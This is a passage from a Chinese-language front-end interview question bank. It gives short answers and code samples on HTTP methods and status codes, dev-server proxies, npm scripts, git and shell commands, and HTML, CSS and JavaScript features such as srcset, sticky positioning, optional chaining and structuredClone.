- 语义：GET 获取资源，安全幂等可被缓存；POST 提交数据，不幂等。
- 参数：GET 在 URL query 上，有长度限制且会进浏览器历史和服务器日志；POST 在 body，理论无限制。
- 本质上都是 HTTP 报文，"GET 只能传 2KB"是旧浏览器地址栏限制的误传，不是协议限制。

```javascript
await fetch('/api/list?page=1&size=20'); // GET：参数在 URL，可被缓存、可收藏
await fetch('/api/list', {               // POST：参数在 body
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ filters: { type: 'vip' } }),
});
```

### BAS-045：常见状态码怎么速记？
**答**：
- 2xx 成功：200 OK、201 Created、204 No Content；3xx 重定向：301 永久、302 临时、304 协商缓存命中。
- 4xx 客户端错误：400 参数错、401 未登录、403 无权限、404 不存在、429 请求过频。
- 5xx 服务端错误：500 内部异常、502 网关收到无效响应、504 网关超时。

```javascript
async function request(url, options) {
  const res = await fetch(url, options);
  if (res.status === 401) { location.href = '/login'; return; }  // 未登录去登录
  if (res.status === 403) { message.error('没有权限'); return; }
  if (res.status === 429) { message.error('操作太频繁，请稍后再试'); return; }
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  return res.json();
}
```

## 六、工程与命令行

### BAS-046：本地开发遇到跨域有哪些办法？
**答**：
- 首选构建工具代理：Vite 的 server.proxy 或 webpack 的 devServer.proxy，浏览器请求同源代理，由代理转发目标服务，无需后端改动。
- 后端配合：开发环境直接开启 CORS 响应头。
- 应急方案：关闭浏览器安全策略启动（仅限本机自测）；JSONP 属于历史方案。

```javascript
// vite.config.js
export default {
  server: {
    proxy: {
      '/api': {
        target: 'https://dev-server.example.com',
        changeOrigin: true, // 修改请求 Host 为目标域名
        // rewrite: (path) => path.replace(/^\/api/, ''),
      },
    },
  },
};
```

本地跨域方案的决策路径：

```mermaid
flowchart TD
    A[本地开发遇到跨域] --> B{后端能否加 CORS 响应头}
    B -->|能| C[开发环境开启 CORS<br/>浏览器直接放行]
    B -->|不能| D{项目用哪个构建工具}
    D -->|Vite| E[配置 server.proxy]
    D -->|webpack| F[配置 devServer.proxy]
    E --> G[浏览器请求同源代理<br/>代理服务器转发给目标服务]
    F --> G
```

### BAS-047：package.json 里最常用的字段有哪些？
**答**：
- name/version：包名与版本；type: "module" 启用 ESM。
- scripts：自定义命令；dependencies 与 devDependencies：生产与开发依赖。
- main/module/exports：入口与导出映射；engines 约束 Node 版本；packageManager 锁定包管理器。

```json
{
  "name": "my-app",
  "version": "1.0.0",
  "type": "module",
  "scripts": { "dev": "vite", "build": "vite build" },
  "dependencies": { "vue": "^3.5.0" },
  "devDependencies": { "vite": "^6.0.0" },
  "engines": { "node": ">=20" },
  "packageManager": "pnpm@9.0.0"
}
```

### BAS-048：npm scripts 怎么传参？
**答**：
- `npm run dev -- --port 3000`：`--` 之后的参数才会透传给脚本本身。
- 组合：`&&` 顺序执行（失败即中断）、`&` 并行；`pre/post` 前缀命令在目标命令前后自动执行。
- 配置型参数用环境变量传递：`NODE_ENV=xxx npm run build`。

```bash
npm run dev -- --port 3000      # 实际执行 vite --port 3000
npm run lint && npm run test    # 顺序执行，lint 失败则不跑 test
npm run predev                  # predev 会在 npm run dev 之前自动执行
NODE_ENV=production npm run build
```

### BAS-049：前端最常用的 git 命令有哪些？
**答**：
- 日常六件套：status、diff、add、commit、push、pull。
- 分支：`switch -c` 新建切换、merge/rebase 合并（rebase 黄金法则：不 rebase 已推送的公共分支）。
- 补救：restore 丢弃工作区改动、revert 生成反向提交（线上分支用）、reset 本地回退、stash 临时暂存。

```bash
git status && git diff            # 先看改了什么
git switch -c feat/login          # 新建并切换分支
git add -p                        # 交互式分块暂存
git commit -m "feat: add login page"
git pull --rebase origin main     # 变基拉取，减少 merge commit
git restore src/a.js              # 丢弃某文件的未暂存改动
git stash && git stash pop        # 临时存取当前改动
git log --oneline -10
```

### BAS-050：前端视角下 Mac 有哪些高频命令？
**答**：
- 目录与查找：ls -la、pwd、find、tree；`open .` 用 Finder 打开当前目录、`code .` 用 VS Code 打开。
- 文本搜索：`grep -rn "keyword" src` 递归搜代码，排查最常用。
- 端口与进程：`lsof -i:3000` 查端口占用、`kill -9 <pid>` 结束进程；brew 管理软件。

```bash
grep -rn "TODO" src/            # 递归搜索代码
lsof -i:3000                    # 查看 3000 端口被哪个进程占用
kill -9 12345                   # 结束占用端口的进程
open http://localhost:5173      # 用默认浏览器打开本地服务
code .                          # VS Code 打开当前目录
brew install node               # Homebrew 安装软件
```

## 七、HTML 补充

### BAS-051：srcset 和 sizes 怎么配合使用？
**答**：
- srcset 提供候选图列表：`url 480w` 的 w 描述符表示图片真实宽度；也支持 `2x` 这类 x 描述符按 DPR 选择。
- sizes 描述"图片在不同视口下实际显示的 CSS 宽度"，浏览器结合 sizes、视口宽度和 DPR 自动挑最合适的条目。
- 浏览器选定图片后一般不随视口变化重选，需要按条件切换构图时用 picture。

```html
<img
  src="photo-800.jpg"
  srcset="photo-400.jpg 400w, photo-800.jpg 800w, photo-1600.jpg 1600w"
  sizes="(max-width: 600px) 100vw, 50vw"
  alt="示例图"
/>
<!-- 视口 600px 以下按 100vw 选图，否则按视口一半宽度选图 -->
```

### BAS-052：picture 元素的"艺术指导"是什么意思？
**答**：
- 艺术指导指不同场景使用构图不同的图片（如移动端用裁剪后的方图），而非同一张图的不同分辨率。
- picture 里多个 source 按顺序匹配 media/type，命中即用；都不命中回退到 img 的 src。
- 分辨率自适应优先用 srcset/sizes，构图切换才用 picture。

```html
<picture>
  <source media="(max-width: 600px)" srcset="logo-square.jpg" />
  <source type="image/webp" srcset="logo.webp" />
  <img src="logo-wide.jpg" alt="站点 Logo" />
</picture>
```

### BAS-053：meta http-equiv 有哪些常用指令？
**答**：
- http-equiv 让 meta 模拟 HTTP 响应头，常用：refresh（定时刷新/跳转）、X-UA-Compatible（指定 IE 内核）、Content-Security-Policy。
- refresh 支持延迟跳转：`content="3;url=/home"`；现代项目跳转优先用 302 或 JS。
- 能配响应头就不要用 http-equiv，只有静态托管改不了响应头时才用它兜底。

```html
<meta http-equiv="refresh" content="3;url=/home" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta http-equiv="Content-Security-Policy" content="default-src 'self'" />
```

### BAS-054：base 标签有什么用？有什么坑？
**答**：
- `<base href>` 为页面所有相对 URL 指定基准路径，`<base target>` 指定链接默认打开方式。
- 坑：锚点 `#xxx` 也会跳到 base 地址而不是当前页锚点；base 必须放在 head 中其他 URL 引用之前。
- SPA history 路由配置好 base 可避免资源 404，但多数框架已用绝对路径处理，base 用得越来越少。

```html
<head>
  <base href="/app/" target="_blank" />
  <!-- 下面的 a href="list.html" 实际请求 /app/list.html，且默认新窗口打开 -->
</head>
<body>
  <a href="list.html">列表页</a>
  <a href="#top">会跳到 /app/#top 而不是当前页锚点</a>
</body>
```

### BAS-055：data-* 属性和 dataset 有什么关系？
**答**：
- data-* 是 HTML 合法的自定义属性，用于在元素上挂业务数据，不影响渲染语义。
- JS 通过 dataset 读写：`data-user-id` 对应 `dataset.userId`，中划线自动转驼峰。
- CSS 可用属性选择器 `[data-state="open"]` 做状态样式，或 `content: attr(data-tip)` 读取值。

```html
<div id="card" data-user-id="42" data-state="open">卡片</div>
<script>
  const card = document.getElementById('card');
  console.log(card.dataset.userId);  // "42"，中划线转驼峰
  card.dataset.state = 'closed';     // 写回后即 data-state="closed"
</script>
```

### BAS-056：contenteditable 是做什么的？
**答**：
- 让任意元素变成可编辑区域：`contenteditable="true"` 开启，是富文本编辑器的底层能力。
- 配合 Selection/Range API 实现加粗、插入内容等编辑操作（老的 document.execCommand 已废弃但仍在用）。
- 可编辑元素的子元素默认一起可编辑，用 `contenteditable="false"` 局部锁定（如 @提及标签、嵌入卡片）。

```html
<div contenteditable="true" id="editor">
  这里可以编辑 <span contenteditable="false">@某人</span> 锁定的提及不可改
</div>
<script>
  document.getElementById('editor').focus();
  console.log(document.activeElement.isContentEditable); // true
</script>
```

### BAS-057：表单元素不在 form 内部还能一起提交吗？
**答**：
- 可以：给表单元素加 `form="formId"` 属性即可关联任意表单，突破 DOM 嵌套结构限制。
- button/input 还支持 formaction、formmethod、formtarget，覆盖对应 form 属性，实现一个表单提交到不同接口。
- 弹窗、组件库场景常用：DOM 结构上分离，逻辑上仍是同一个表单。

```html
<form id="search" action="/search" method="get">
  <input name="q" />
</form>
<!-- 逻辑上属于 search 表单，但 DOM 在表单外面 -->
<input form="search" name="page" value="1" />
<button form="search" formmethod="post" formaction="/advanced">高级搜索</button>
```

### BAS-058：HTML5 新增了哪些实用的 input type？
**答**：
- email、url、number、tel、search：移动端弹对应键盘，email/url 还触发原生格式校验。
- date、time、datetime-local、month：原生日期选择器，省去第三方组件。
- range、color、file：滑块、取色器、多文件上传；配合 min/max/step/pattern/required 做约束校验，非法时浏览器原生拦截提交。

```html
<form>
  <input type="email" required placeholder="邮箱" />
  <input type="number" min="1" max="100" step="1" />
  <input type="date" />
  <input type="range" min="0" max="100" />
  <input type="color" />
  <input type="text" pattern="[0-9]{6}" title="六位数字" />
  <button>提交</button>
</form>
```

### BAS-059：details 和 summary 怎么做原生折叠面板？
**答**：
- details 默认折叠，summary 是标题；点击 summary 切换 open 属性，无需任何 JS。
- 可用 `details[open]` 选择器做展开样式，监听 toggle 事件感知展开收起；多个 details 设相同 name 属性可互斥展开（手风琴）。
- 局限：展开动画控制弱，复杂交互仍需 JS。

```html
<details name="faq">
  <summary>什么是闭包？</summary>
  <p>函数与其词法作用域的组合……</p>
</details>
<details name="faq">
  <summary>什么是原型链？</summary>
  <p>对象通过原型逐级连接……</p>
</details>
<script>
  document.querySelectorAll('details').forEach(d =>
    d.addEventListener('toggle', () => console.log(d.open)));
</script>
```

### BAS-060：原生 dialog 元素怎么用？
**答**：
- `showModal()` 打开模态态：自动居中、自带 ::backdrop 遮罩、焦点管理、Esc 可关、进入 top layer 不受 z-index 影响。
- `show()` 是非模态展示；`close(returnValue)` 关闭，`form method="dialog"` 提交即关闭并把按钮 value 带回 returnValue。
- 相比手写弹窗，天然解决焦点圈闭和层叠层级问题。

```html
<dialog id="dlg">
  <form method="dialog">
    <p>确认删除？</p>
    <button value="yes">确定</button>
    <button value="no">取消</button>
  </form>
</dialog>
<script>
  const dlg = document.getElementById('dlg');
  dlg.showModal();
  dlg.addEventListener('close', () => console.log(dlg.returnValue)); // yes 或 no
</script>
```

### BAS-061：SEO 三件套指什么？
**答**：
- title：权重最高的关键词位置，每页唯一，推荐"页面名 - 站点名"结构。
- meta description：搜索结果里的摘要文案，不直接决定排名但影响点击率。
- canonical：声明规范 URL，把带参数、http/https 等多个 URL 变体的权重收敛到一个地址，避免重复页面分散权重。

```html
<title>前端面试题库 - 某站</title>
<meta name="description" content="一题一考点的前端基础速答题库，覆盖 HTML、CSS、JS、网络与工程化。" />
<link rel="canonical" href="https://example.com/basics" />
```

## 八、CSS 补充·布局与交互

### BAS-062：position: sticky 生效需要什么条件？
**答**：
- 必须至少指定 top/right/bottom/left 之一，否则等于 relative 不吸附。
- 任一祖先的 overflow 不是 visible（如 hidden/auto/scroll）会让 sticky 失效——最常见的坑；父级 B 和祖先链都要检查。
- 吸附范围被限制在父元素内：父元素滚出视口，sticky 元素跟着离开；且元素不能比父容器还高。

```css
/* 表头吸顶：注意父级链上不能有 overflow: hidden */
.table-wrap { height: 500px; overflow: auto; }
th {
  position: sticky;
  top: 0;
  background: #fff;
  z-index: 1;
}
```

### BAS-063：z-index 什么时候会失效？
**答**：
- 元素不是定位元素（position 为 static）且不参与 flex/grid 布局时，z-index 无效；flex/grid 子项例外，无需定位也能生效。
- 父级创建了层叠上下文后，子元素 z-index 只在父上下文内部比较，跨上下文时由父级整体决定。
- transform、opacity < 1、filter、will-change、isolation 等会隐式创建层叠上下文，导致"z-index 很大却盖不住别人"。

```css
.parent { transform: translateZ(0); }       /* 隐式创建层叠上下文 */
.parent .child { z-index: 9999; }           /* 只在 parent 内部比较 */
.other { position: relative; z-index: 1; }  /* parent 整体 z-index 为 auto，可能被 .other 盖住 */
```

### BAS-064：flex/grid 的 gap 和用 margin 排间距有什么区别？
**答**：
- gap 只作用于项目之间，首尾项目外侧没有多余空隙，不需要负 margin 或 :last-child 清理。
- margin 方案会在末尾多出一份间距，需要容器负 margin 抵消或选择器摘除，写法繁琐。
- gap 语义更清晰，支持 row-gap/column-gap 分开设值，是现代布局排间距的首选。

```css
/* margin 方案：需要抵消尾部空隙 */
.list-margin { display: flex; margin: 0 -8px; }
.list-margin > * { margin: 0 8px; }

/* gap 方案：一行解决 */
.list-gap { display: flex; gap: 16px; }
```

### BAS-065：aspect-ratio 怎么用？什么时候失效？
**答**：
- `aspect-ratio: 16 / 9` 让元素按宽高比自动计算另一边，替代 padding-top 百分比占位的 hack。
- 宽高都被显式指定（非 auto）时比例被忽略；内容撑高也会破坏比例，必要时配合 overflow 或 min-height: 0 约束。
- 常用于视频容器、封面图占位、卡片缩略图。

```css
.video-box {
  width: 100%;
  aspect-ratio: 16 / 9;   /* 高度自动算出 */
}
.avatar {
  width: 48px;
  height: 48px;           /* 宽高都写死，aspect-ratio 失效 */
  aspect-ratio: 1;
}
```

### BAS-066：margin 和 padding 的百分比是相对什么计算的？
**答**：
- 四个方向的百分比一律参照包含块的**宽度**，包括 margin-top/bottom、padding-top/bottom。
- 因此 `padding-top: 56.25%` 可做出宽随容器、高为宽 16:9 的自适应占位框（老式响应式视频方案）。
- 背错成"上下参照高度"会导致布局计算全错，这是高频陷阱题。

```css
.ratio-box {
  width: 80%;
  padding-top: 56.25%;   /* 高度 = 宽度 * 0.5625，即 16:9 */
  position: relative;
}
.ratio-box > iframe {
  position: absolute; inset: 0; width: 100%; height: 100%;
}
```

### BAS-067：pointer-events 有哪些实用取值？
**答**：
- `pointer-events: none` 让元素对鼠标/触摸完全"透明"，点击穿透到下层元素；常用于装饰层、提示层。
- 对 HTML 元素基本只用 auto 和 none；SVG 还有 visiblePainted 等精细取值。
- 典型场景：禁用态按钮不再响应也不显手型、canvas 覆盖的提示文案不挡操作、自定义点击穿透。

```css
.overlay-tip {
  position: absolute; inset: 0;
  pointer-events: none;      /* 提示层不拦截点击 */
}
.btn:disabled { pointer-events: none; }  /* 点击直接穿透 */
```

### BAS-068：scroll-behavior 和 overscroll-behavior 分别管什么？
**答**：
- scroll-behavior: smooth 让锚点跳转、scrollTo 等程序滚动变为平滑滚动，一行 CSS 替代 JS 动画。
- overscroll-behavior: contain 阻止滚动链——内层滚到头后不再带动外层/body 滚动，弹窗内滚动必备。
- overscroll-behavior 另有 none（还取消过头回弹）、auto（默认）。

```css
html { scroll-behavior: smooth; }        /* 锚点跳转平滑滚动 */
.modal-body {
  overflow: auto;
  overscroll-behavior: contain;          /* 滚到底不再传染给页面 */
}
```

### BAS-069：CSS scroll-snap 怎么做轮播/整屏滚动？
**答**：
- 滚动容器设 `scroll-snap-type`（如 x mandatory），子项设 `scroll-snap-align: start/center/end`，滚动结束后自动吸附。
- mandatory 强制吸附，proximity 接近吸附点才吸；容器配 scroll-padding 处理吸顶导航遮挡。
- 纯 CSS 轮播 = 横向 overflow 滚动 + snap，比 JS 轮播库轻量且保留原生滚动手感。

```css
.carousel {
  display: flex;
  overflow-x: auto;
  scroll-snap-type: x mandatory;
  scroll-padding-left: 16px;
}
.carousel > * {
  flex: 0 0 100%;
  scroll-snap-align: start;
}
```

### BAS-070：touch-action 解决什么问题？
**答**：
- 声明元素上允许哪些触摸手势交给浏览器处理，是"浏览器手势"与"页面滚动"之间的总开关。
- `touch-action: none` 把所有触摸交给 JS（canvas 画板、拖拽）；`pan-y` 只允许纵向滚动、横向手势留给 JS。
- 横滑轮播、自定义滑块设 `pan-y`，可消除横向滑动与浏览器手势的冲突抖动。

```css
.slider {
  touch-action: pan-y;   /* 纵向滚动交还浏览器，横向手势自己处理 */
}
.canvas-board {
  touch-action: none;    /* 画板上所有触摸都给 JS */
}
```

## 九、CSS 补充·视觉与排版

### BAS-071：object-fit 的几个值分别是什么效果？
**答**：
- 控制替换元素（img/video）内容如何填入元素框：cover 等比放大裁剪填满（最常用）；contain 等比缩放完整显示、留空白。
- fill 是默认值，不保比例直接拉伸变形；none 不缩放按原始尺寸；scale-down 取 none 和 contain 中显示更小的那个。
- 配合 object-position 调整裁剪焦点，如 `object-position: center top` 保住人像头部。

```css
.cover { object-fit: cover; object-position: center top; }  /* 裁剪填充，焦点在顶部 */
.contain-box { object-fit: contain; background: #eee; }     /* 完整显示，留白 */
.stretch { object-fit: fill; }                              /* 拉伸变形，慎用 */
```

### BAS-072：background 简写有什么陷阱？
**答**：
- 简写 `background: url(a.png) center / cover no-repeat` 会把未写出的子属性全部重置为默认值，之前单独设置的 background-color 会被悄悄清掉。
- 简写里 position 和 size 共用一段：size 必须写在 position 之后用 `/` 分隔，只写 size 不写 position 非法。
- 多背景用逗号分层，背景色只能写在最后一层。

```css
.box {
  background-color: #333;                          /* 会被下面的简写重置为 transparent */
  background: url(a.png) center / cover no-repeat;
}
/* 正确做法：颜色写进简写最后一层 */
.box2 { background: url(a.png) center / cover no-repeat, #333; }
```

### BAS-073：outline 和 border 有什么区别？focus-visible 是什么？
**答**：
- outline 画在边框外、不占布局空间、不能单边设置；border 参与盒模型占空间。
- :focus-visible 只在"键盘聚焦"（Tab 导航）时匹配，鼠标点击不匹配，解决了直接去 outline 后键盘可访问性丢失的问题。
- 自定义聚焦样式务必保留键盘焦点指示：`:focus-visible { outline: ... }`；全局 `outline: none` 是可访问性大忌。

```css
.btn:focus { outline: none; }            /* 不推荐：键盘用户失去焦点指示 */
.btn:focus-visible {
  outline: 2px solid #2563eb;
  outline-offset: 2px;                   /* outline 与元素间留缝隙 */
}
```

### BAS-074：will-change 的正确用法是什么？
**答**：
- 提前告知浏览器某属性将要变化，让它预先做合成层等优化；只对 transform/opacity 等合成属性有明显收益。
- 应在动画前加上、结束后移除（如 hover 父级预告、JS onstart/onend 控制），常驻大量 will-change 反而耗内存、造成层爆炸。
- 不能当性能万能药：先测量再优化，多数场景 transition 本身已够。

```css
.card { transition: transform 0.3s; }
.card-parent:hover .card {
  will-change: transform;   /* 动画触发前预告 */
}
.card-parent:not(:hover) .card {
  will-change: auto;        /* 结束后释放 */
}
```

### BAS-075：content-visibility 是做什么的？
**答**：
- `content-visibility: auto` 让屏幕外元素跳过渲染（布局与绘制），长列表/长页面首屏渲染大幅提速。
- 配合 `contain-intrinsic-size` 给屏幕外元素估算占位尺寸，防止滚动条跳动。
- 与虚拟滚动区别：零 JS、保留真实 DOM，优化的是渲染而非 DOM 数量。

```css
section.feed-item {
  content-visibility: auto;
  contain-intrinsic-size: auto 300px;  /* 屏幕外按估算高度占位 */
}
```

### BAS-076：user-select 和 caret-color 有什么用？
**答**：
- user-select 控制文本可选中性：none 防误选（按钮、仿 App 界面），all 点击整段选中，text 恢复可选。
- caret-color 自定义输入光标颜色，none 隐藏光标，可与主题色统一。
- 体验细节考点：user-select: none 只是不可选，内容仍在 DOM 里，不是"禁复制"的安全手段。

```css
.btn, .tab { user-select: none; }       /* 控件文字不可拖选 */
.snippet { user-select: all; }          /* 点一下整段选中，方便复制 */
.dark-input { caret-color: #38bdf8; }   /* 光标与主题同色 */
```

### BAS-077：clip-path 和 mask 有什么区别？
**答**：
- clip-path 用基本形状（circle、polygon、inset）或 path 裁剪可见区域，边界生硬、矢量形状。
- mask 用图片/渐变的透明度做遮罩，能做羽化、渐隐、复杂贴图蒙版，`mask-image: linear-gradient(...)` 实现图片底部渐隐很常用。
- 两者都不影响布局，被裁掉的不可见区域同样不响应鼠标事件。

```css
.tri { clip-path: polygon(0 0, 100% 0, 100% 100%); }  /* 直角三角形 */
.fade-img {
  mask-image: linear-gradient(to bottom, #000 60%, transparent);  /* 底部渐隐 */
}
```

### BAS-078：mix-blend-mode 和 background-blend-mode 的区别？
**答**：
- mix-blend-mode 让元素与其**下方所有内容**混合，常用 multiply（正片叠底）、screen（滤色）、difference（差值反色）。
- background-blend-mode 只在同一元素的**多层 background 之间**混合（背景图与背景色），不影响页面其他内容。
- 经典应用：双色调图片（图片 + 纯色 multiply）、深浅背景上自动反色的文字（difference）。

```css
.duotone {
  background: url(photo.jpg) center / cover, #7c3aed;
  background-blend-mode: multiply;   /* 图片与紫色底混合出双色调 */
}
.invert-text { mix-blend-mode: difference; color: #fff; }  /* 深浅背景上自动反色 */
```

### BAS-079：line-height 写 1.5、1.5em、150% 有什么区别？
**答**：
- 无单位 1.5：子元素继承的是"比例"，按子元素自己的 font-size 计算，推荐写法。
- 1.5em 或 150%：父元素先算成具体 px 再被继承，子元素 font-size 更大时行高不跟随，出现文字重叠。
- 结论：行高永远用无单位数字。

```css
.parent { font-size: 16px; line-height: 150%; }   /* 计算值 24px 被继承 */
.child  { font-size: 32px; line-height: inherit; }/* 行高仍 24px，文字重叠 */
/* 若父级写 line-height: 1.5，子级行高 = 32 * 1.5 = 48px，正常 */
```

### BAS-080：font 简写有什么陷阱？
**答**：
- font 简写必须同时包含 font-size 和 font-family，缺一整条失效；且会把 style/variant/weight/line-height 等重置为默认。
- 行高要写进简写：`font: 14px/1.5 Arial`，size 后用斜杠接 line-height。
- 想保留粗体等设置，要么写进简写（`font: bold 14px/1.5 Arial`），要么放在简写之后。

```css
p {
  font-weight: bold;                          /* 会被下面的简写重置为 normal */
  font: 14px/1.5 "PingFang SC", sans-serif;   /* 合法：size 与 family 必填 */
  font-weight: bold;                          /* 想要粗体就写在简写之后 */
}
```

## 十、JavaScript 语法补充

### BAS-081：可选链 ?. 和空值合并 ?? 怎么组合使用？
**答**：
- `a?.b?.c` 遇 null/undefined 短路返回 undefined 不抛错；`a?.b ?? '默认值'` 在空值时兜底。
- ?? 只把 null/undefined 当空值，0 和 '' 是合法值会保留——这是相对 || 的核心区别。
- ?. 还能安全调用函数 `fn?.()`；注意 ?. 左侧不能作为赋值目标。

```javascript
const user = { profile: { name: 'A' } };
const city = user?.profile?.city ?? '未知城市'; // '未知城市'，不抛错
const count = 0;
console.log(count ?? 10);   // 0，?? 不吞 0
console.log(count || 10);   // 10，|| 会吞 0
// user?.name = 'x';        // SyntaxError，?. 左侧不能赋值
```

### BAS-082：逻辑赋值运算符 ??=、||=、&&= 分别是什么？
**答**：
- `a ??= b`：a 为 null/undefined 才赋值；`a ||= b`：a 为假值才赋值；`a &&= b`：a 为真值才赋值。
- 本质是短路赋值简写，只在需要时才写入，避免多余赋值触发 setter。
- 常见用途：默认值初始化用 ??=，缓存兜底用 ||=。

```javascript
const obj = { retries: 0, label: '' };
obj.retries ??= 3;          // 保持 0，??= 不把 0 当空值
obj.label   ||= '默认标题'; // '' 是假值，赋为默认标题
obj.debug   &&= true;       // debug 是 undefined，短路不赋值
console.log(obj);           // { retries: 0, label: '默认标题' }
```

### BAS-083：数值分隔符和指数运算符怎么写？
**答**：
- 大数字面量用下划线分组提高可读性：`1_000_000_000`，下划线不影响数值本身。
- 指数运算符 `**` 右结合：`2 ** 3 ** 2 = 2 ** 9 = 512`；开平方可写 `x ** 0.5`。
- 与一元运算符混用需加括号：`-2 ** 2` 是语法错误，必须写 `(-2) ** 2`。

```javascript
const msPerDay = 24 * 60 * 60 * 1_000;  // 86400000
console.log(2 ** 10);       // 1024
console.log(2 ** 3 ** 2);   // 512，右结合
console.log(16 ** 0.5);     // 4，开平方
// console.log(-2 ** 2);    // SyntaxError，必须写 (-2) ** 2
```

### BAS-084：slice、splice、at() 有什么区别？
**答**：
- slice(start, end) 纯读取，返回新数组、支持负索引、不改原数组；splice(start, deleteCount, ...items) 修改原数组，用于删除和插入。
- at(i) 是取值方法，支持负索引：`arr.at(-1)` 取最后一项，比 `arr[arr.length - 1]` 清晰，字符串同样适用。
- 记忆：要改原数组用 splice，只要副本用 slice，取单个元素用 at。

```javascript
const arr = [1, 2, 3, 4, 5];
console.log(arr.slice(1, 3));      // [2, 3]，原数组不变
console.log(arr.at(-1));           // 5
console.log(arr.splice(1, 2, 9));  // [2, 3]，返回被删项
console.log(arr);                  // [1, 9, 4, 5]，原数组被修改
```

### BAS-085：structuredClone 和 JSON 深拷贝有什么区别？
**答**：
- structuredClone 是原生深拷贝：支持循环引用、Map/Set、Date、RegExp、ArrayBuffer、Blob 等。
- JSON.stringify/parse 会丢 undefined/function/Symbol，Date 变字符串，NaN/Infinity 变 null，循环引用直接抛错。
- structuredClone 也有限制：不能拷贝函数、DOM 节点，原型链方法丢失（拷贝后变普通对象）。

```javascript
const src = { date: new Date(), list: new Set([1, 2]) };
src.self = src;                                  // 循环引用
const a = structuredClone(src);
console.log(a.date instanceof Date, a.list instanceof Set); // true true
try {
  JSON.parse(JSON.stringify(src));               // 循环引用直接抛错
} catch (e) {
  console.log('JSON 深拷贝失败，且类型信息本就会丢失');
}
```

### BAS-086：浏览器和 Node 里全局的 this 分别是什么？
**答**：
- 浏览器普通 script 顶层 this 是 window；`type="module"` 模块顶层 this 是 undefined。
- Node CommonJS 文件顶层 this 是 module.exports；全局对象通过 globalThis 获取（即 global）。
- 跨环境取全局对象的标准方式是 globalThis，不要猜 window 或 global。

```javascript
// 浏览器 <script> 中
console.log(this === window);      // true
console.log(globalThis === this);  // true

// 浏览器 <script type="module"> 中
console.log(this === undefined);   // true

// Node CJS 模块中
// console.log(this === module.exports);  // true
```

### BAS-087：Symbol 有哪些实际用途？
**答**：
- 创建全局唯一值作对象键，避免属性名冲突；`Symbol.for('key')` 走全局注册表，可跨模块共享。
- 访问语言内置协议：Symbol.iterator、Symbol.toPrimitive、Symbol.asyncIterator 等让对象接入迭代、类型转换机制。
- 作为"半私有"属性：不出现在 for...in 和 Object.keys 中（仍可用 getOwnPropertySymbols 取到），JSON.stringify 也会忽略。

```javascript
const CACHE = Symbol('cache');
class Store {
  [CACHE] = new Map();               // 不会被 Object.keys 枚举
  get(k) { return this[CACHE].get(k); }
}
console.log(Object.keys(new Store()));             // []
console.log(Symbol('a') === Symbol('a'));          // false，每次唯一
console.log(Symbol.for('a') === Symbol.for('a'));  // true，注册表共享
```

### BAS-088：可迭代协议和迭代器协议是什么关系？
**答**：
- 可迭代协议：对象实现 `[Symbol.iterator]()` 方法并返回一个迭代器，即可被 for...of、展开、解构消费。
- 迭代器协议：返回的对象带 next()，每次返回 `{ value, done }`，done 为 true 表示结束。
- Array/String/Map/Set/NodeList 原生可迭代；普通对象默认不可迭代，`{...obj}` 用的是可枚举属性而非迭代协议。

```javascript
const range = {
  from: 1, to: 3,
  [Symbol.iterator]() {
    let cur = this.from - 1;
    return {
      next: () => (cur < this.to ? { value: ++cur, done: false } : { done: true }),
    };
  },
};
console.log([...range]);              // [1, 2, 3]
for (const n of range) console.log(n); // 1 2 3
```

### BAS-089：generator 函数的基础用法是什么？
**答**：
- function* 声明，调用后不立即执行而是返回迭代器；每次 next() 执行到下一个 yield 暂停并交出值。
- yield 可双向传值：next(x) 的 x 成为上一个 yield 表达式的返回值；实现 Symbol.iterator 后天然支持 for...of。
- 典型用途：惰性/无限序列、状态机；async/await 可视为 generator + 自动执行器演化来的语法糖。

```javascript
function* fib() {
  let [a, b] = [0, 1];
  while (true) { yield a; [a, b] = [b, a + b]; }  // 无限惰性序列
}
const it = fib();
console.log(it.next().value); // 0
console.log(it.next().value); // 1
console.log(it.next().value); // 1
console.log(it.next().value); // 2
```

### BAS-090：in 和 hasOwnProperty 有什么区别？
**答**：
- `'a' in obj` 检查键是否存在于对象及其整条原型链；hasOwnProperty 只查自身属性。
- 数组上 `0 in arr` 检查的是索引存在性而不是值；稀疏数组的空洞 in 为 false。
- 现代写法用 `Object.hasOwn(obj, 'a')`（ES2022），比直接调 obj.hasOwnProperty 更安全（对象可能没有原型方法）。

```javascript
const obj = Object.create({ inherited: 1 });
obj.own = 2;
console.log('own' in obj, 'inherited' in obj);  // true true
console.log(Object.hasOwn(obj, 'own'));         // true
console.log(Object.hasOwn(obj, 'inherited'));   // false
console.log(0 in [7]);                          // true，检查索引
```

### BAS-091：Object.freeze 和 Object.seal 有什么区别？
**答**：
- seal 密封：不能增删属性，已有属性值仍可改；freeze 冻结：在 seal 基础上值也不可改（writable 变 false）。
- 两者都是浅操作：嵌套对象内部不受影响，深冻结需递归处理。
- 严格模式下修改冻结对象抛 TypeError；冻结的数组不能 push。

```javascript
'use strict';
const s = Object.seal({ a: 1 });
s.a = 10;            // 允许：seal 只封结构
// s.newKey = 1;     // TypeError：不能新增属性
const f = Object.freeze({ nested: { b: 2 } });
// f.nested = {};    // TypeError
f.nested.b = 99;     // 浅冻结：内部对象照样能改
console.log(f.nested.b);  // 99
```

### BAS-092：怎么手写一个浅比较？
**答**：
- 浅比较：先比引用；再比键数量；最后逐个用 Object.is 比第一层值，嵌套对象只比引用。
- React.memo / PureComponent 的默认 props 比较就是这个逻辑，引用变化的深嵌套对象会让浅比较失效。
- Object.is 比 === 更精确：区分 +0/-0，NaN 等于自身。

```javascript
function shallowEqual(a, b) {
  if (Object.is(a, b)) return true;
  if (typeof a !== 'object' || a === null || typeof b !== 'object' || b === null) return false;
  const ka = Object.keys(a), kb = Object.keys(b);
  if (ka.length !== kb.length) return false;
  return ka.every(k => Object.is(a[k], b[k]));
}
console.log(shallowEqual({ x: 1 }, { x: 1 }));               // true
console.log(shallowEqual({ o: { y: 1 } }, { o: { y: 1 } })); // false，嵌套只比引用
```

### BAS-093：0.1 + 0.2 为什么不等于 0.3？取整方式有什么区别？
**答**：
- IEEE 754 双精度以二进制存储，0.1、0.2 都是无限循环小数的近似值，相加产生 0.30000000000000004。
- 比较用容差：`Math.abs(a - b) < Number.EPSILON`；金额计算先换算成整数（分）或用 big.js 等库。
